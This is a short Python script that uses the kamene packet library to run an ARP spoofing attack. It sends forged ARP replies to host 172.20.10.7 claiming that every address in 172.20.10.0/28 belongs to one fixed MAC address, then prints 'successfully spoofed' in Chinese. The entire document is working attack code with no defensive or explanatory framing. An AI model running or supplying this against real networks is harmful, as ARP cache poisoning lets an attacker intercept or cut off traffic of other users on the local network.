from kamene.all import *
import ipaddress
net = ipaddress.ip_network("172.20.10.0/28")
for ip in net:
    print(ip)
    a = sr1(ARP(op=2,psrc=str(ip),pdst='172.20.10.7',hwsrc='b0:52:16:93:9a:41'),
            verbose=False,
            timeout=1)
    print(f'{a}  成功欺骗')
